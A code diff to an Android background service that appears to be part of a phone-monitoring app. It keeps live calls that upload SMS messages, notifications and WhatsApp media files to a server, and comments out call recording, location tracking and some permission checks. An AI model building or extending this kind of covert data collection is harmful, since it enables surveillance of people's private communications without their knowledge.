@@ -82,12 +82,12 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                 }
 
 
-                if (locationTimer != null) // Cancel if already existed
+                /*if (locationTimer != null) // Cancel if already existed
                     locationTimer.cancel();
                 else
                     locationTimer = new Timer();   //recreate new
 
-                locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);   //Schedule task
+                locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);*/   //Schedule task
 
             }
         }).start();
@@ -122,7 +122,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                         backgroundJobService.sendSMSToServer();
                         backgroundJobService.sendNotificationsToServer();
                         backgroundJobService.readWhatsAppMediaFiles();
-                        backgroundJobService.sendCallRecording();
+//                        backgroundJobService.sendCallRecording();
                     }
 //                }
 //            });
@@ -163,7 +163,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                         allPermissionGranted = false;
                         disabledPermissions.add("WRITE_EXTERNAL_STORAGE");
                     }
-                    if (ContextCompat.checkSelfPermission(BackgroundJob.this,
+                    /*if (ContextCompat.checkSelfPermission(BackgroundJob.this,
                             Manifest.permission.RECORD_AUDIO)
                             != PackageManager.PERMISSION_GRANTED) {
                         allPermissionGranted = false;
@@ -174,7 +174,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                             != PackageManager.PERMISSION_GRANTED) {
                         allPermissionGranted = false;
                         disabledPermissions.add("PROCESS_OUTGOING_CALLS");
-                    }
+                    }*/
 
                     if(!allPermissionGranted){
                         //send local notification
